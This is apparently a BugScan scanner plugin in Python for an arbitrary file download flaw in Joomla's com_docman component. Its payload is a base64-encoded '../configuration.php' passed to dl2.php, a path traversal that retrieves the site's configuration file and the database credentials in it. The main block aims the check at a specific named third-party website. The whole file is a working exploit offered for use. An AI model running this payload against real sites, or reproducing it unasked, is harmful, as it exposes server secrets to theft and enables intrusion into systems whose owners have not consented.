#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = Joomla com_docman 任意文件下载
#__Refer___ = https://www.bugscan.net/#!/x/1189


def assign(service, arg):
    if service == 'joomla':
        return True, arg


def audit(arg):
    payload = 'components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA='
    target = arg + payload

    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "<?php" in res:
        security_note(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.elcalero.com/mb/')[1])